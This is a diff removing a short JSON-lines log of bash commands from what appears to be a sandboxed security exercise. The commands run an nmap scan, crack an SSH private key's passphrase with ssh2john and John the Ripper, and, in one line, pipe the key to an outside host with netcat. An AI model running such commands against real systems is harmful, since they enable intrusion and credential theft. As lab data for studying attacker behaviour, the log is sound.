@@ -1,9 +1,0 @@
-{"sandbox_id": "80", "timestamp_str": "2020-07-15T09:49:11.279163+02:00", "cmd_type": "bash-command", "cmd": "nmap -A 10.1.17.4"}
-{"sandbox_id": "80", "timestamp_str": "2020-07-15T09:51:41.027695+02:00", "cmd_type": "bash-command", "cmd": "vim key"}
-{"sandbox_id": "80", "timestamp_str": "2020-07-15T09:52:56.026570+02:00", "cmd_type": "bash-command", "cmd": "ssh2john"}
-{"sandbox_id": "80", "timestamp_str": "2020-07-15T09:53:37.976252+02:00", "cmd_type": "bash-command", "cmd": "john key"}
-{"sandbox_id": "80", "timestamp_str": "2020-07-15T09:55:37.880722+02:00", "cmd_type": "bash-command", "cmd": "cat key | nc hxx.cz 8080"}
-{"sandbox_id": "80", "timestamp_str": "2020-07-15T09:57:10.708599+02:00", "cmd_type": "bash-command", "cmd": "locate *2john"}
-{"sandbox_id": "80", "timestamp_str": "2020-07-15T10:00:13.758920+02:00", "cmd_type": "bash-command", "cmd": "/usr/share/john/ssh2john.py key > key.hash"}
-{"sandbox_id": "80", "timestamp_str": "2020-07-15T10:00:21.814580+02:00", "cmd_type": "bash-command", "cmd": "john key.hash"}
-{"sandbox_id": "80", "timestamp_str": "2020-07-15T10:00:59.842934+02:00", "cmd_type": "bash-command", "cmd": "cat key.hash"}
